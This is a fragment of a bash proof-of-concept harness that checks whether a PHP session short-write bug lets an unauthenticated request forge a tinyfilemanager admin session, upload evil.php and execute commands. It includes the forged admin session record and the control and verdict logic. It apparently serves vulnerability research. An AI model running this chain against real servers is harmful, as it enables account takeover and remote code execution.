CTL_PROMOTED=0
if [ "$NATIVE_ATTACK" = 0 ]; then
    python3 - "$DUMP" <<'EOF' >> "$LOG" 2>&1 && CTL_PROMOTED=1
import sys
d = open(sys.argv[1], 'rb').read()
ok = b'}filemanager|a:1:{s:6:"logged";s:5:"admin";}' in d
print(f"control-write-dump: has-evil-record:{ok}")
sys.exit(0 if ok else 1)
EOF
    [ "$CTL_PROMOTED" = 1 ] && echo "   CONTROL UNEXPECTED: evil record without death — harness invalid" | tee -a "$LOG" \
                           || echo "   control (no death): no evil record in the app session write, as expected" | tee -a "$LOG"
fi
CTL_TOKEN=$(python3 -c 'import re,sys
d=open(sys.argv[1],"r",errors="replace").read()
m=re.search(r"name=\"token\" value=\"([0-9a-f]+)\"",d)
print(m.group(1) if m else "")' "$D/consumerCTL.out")
if [ -n "$CTL_TOKEN" ] && ! grep -q 'name="fm_usr"' "$D/consumerCTL.out"; then
    echo "   CONTROL UNEXPECTED: logged-in page without death — inspect $LOG" | tee -a "$LOG"
elif grep -q 'name="fm_usr"' "$D/consumerCTL.out"; then
    echo "   control (no death): login form, no session takeover" | tee -a "$LOG"
else
    echo "   CONTROL INVALID: neither login form nor admin page — inspect $LOG" | tee -a "$LOG"
fi
if [ -f "$WEB/evil.php" ] || [ -f "$MARKER" ]; then
    echo "   CONTROL UNEXPECTED: upload or marker present without death" | tee -a "$LOG"
fi
CTL_OK=0
if grep -q 'name="fm_usr"' "$D/consumerCTL.out" && [ "$CTL_PROMOTED" = 0 ] && [ ! -f "$WEB/evil.php" ] && [ ! -f "$MARKER" ]; then
    CTL_OK=1
fi
echo "control-no-death-check: ok=$CTL_OK" >> "$LOG"

# safe-input control: virgin sid, no carrier, no death
rm -f "$SESS"/sess_* "$WEB/evil.php" "$MARKER"
consumer SAFE cccc00112233445566778899aabbcccc > "$D/consumerSAFE.out" 2>&1
SAFE_OK=0
if grep -q 'name="fm_usr"' "$D/consumerSAFE.out" && [ ! -f "$MARKER" ] && [ ! -f "$WEB/evil.php" ]; then
    SAFE_OK=1
    echo "   safe-input control (virgin sid): login form, no upload, marker absent" | tee -a "$LOG"
else
    echo "   safe-input control UNEXPECTED — inspect $LOG" | tee -a "$LOG"
fi
echo "safe-input-check: ok=$SAFE_OK" >> "$LOG"

# ---------------------------------------------------------------- verdict
echo "== verdict scan (log: $LOG)" | tee -a "$LOG"
[ "$MIXOK" = 1 ] && echo "   splice on disk before the consumer (k1new || C[K:])" | tee -a "$LOG" \
                  || echo "   post-run file NOT the splice (8.4.28: expected)" | tee -a "$LOG"
if [ "$PROMOTED" = 2 ]; then
    echo "   native producer/consumer: no preload; promotion judged by tinyfilemanager authentication" | tee -a "$LOG"
else
    [ "$PROMOTED" = 1 ] && echo "   UNAUTH PRODUCER -> REAL-APP CONSUMER: promoted admin record observed in the app session write" | tee -a "$LOG" \
                        || echo "   no promotion through the app (see $LOG)" | tee -a "$LOG"
fi
[ "$TAKEOVER" = 1 ] && echo "   UNAUTH SESSION TAKEOVER of tinyfilemanager admin through the splice" | tee -a "$LOG" \
                    || echo "   no takeover (8.4.28/no-death: expected)" | tee -a "$LOG"
if [ "$EXECOK" = 1 ]; then
    echo "   UNAUTH -> $DEATH_MODE SHORT-WRITE/STATE-FREEZE -> ADMIN UPLOAD -> LIVE-WORKER COMMAND EXECUTION (marker $MTAG)" | tee -a "$LOG"
else
    echo "   no command execution (8.4.28/no-death: expected)" | tee -a "$LOG"
fi
if [ "$DEATH_MODE" = rlimit ]; then
    echo "   native limits: worker FSIZE=$K:$K CPU=${CPU_LIMIT:-none}:${CPU_LIMIT:-none}; phase-2 LD_PRELOAD unset" | tee -a "$LOG"
fi
grep -qE 'AddressSanitizer|runtime error:|SEGV|Assertion.*failed|SUMMARY' "$LOG" && \
    echo "   SANITIZER/ASSERT OUTPUT PRESENT — inspect $LOG" | tee -a "$LOG"
if [ -f "$D/fpm-error.log" ]; then
    echo "--- fpm-error.log ---" >> "$LOG"
    grep -E 'signal|exited|WARNING|ERROR' "$D/fpm-error.log" >> "$LOG" 2>/dev/null || true
fi
POSITIVE_OK=0
NEGATIVE_OK=0
if [ "$MIXOK" = 1 ] && [ "$TAKEOVER" = 1 ] && [ "$EXECOK" = 1 ] && [ "$MARKER_OK" = 1 ] && [ "$DEATH_OK" = 1 ] && [ "$CTL_OK" = 1 ] && [ "$SAFE_OK" = 1 ]; then
    POSITIVE_OK=1
fi
if [ "$MIXOK" = 0 ] && [ "$TAKEOVER" = 0 ] && [ "$EXECOK" = 0 ] && [ ! -f "$MARKER" ] && [ "$CTL_OK" = 1 ] && [ "$SAFE_OK" = 1 ]; then
    NEGATIVE_OK=1
fi
echo "result-check: positive=$POSITIVE_OK negative=$NEGATIVE_OK death=$DEATH_OK marker=$MARKER_OK no-death-control=$CTL_OK safe-control=$SAFE_OK" | tee -a "$LOG"
if { [ "$APP_HEALTH" = 0 ] && { [ "$DEATH_MODE" = shim ] || [ "${PREBURN:-0}" = 1 ]; }; } || [ "$GAP" = 1 ]; then
    [ "$POSITIVE_OK" = 1 ]
else
    [ "$NEGATIVE_OK" = 1 ]
fi
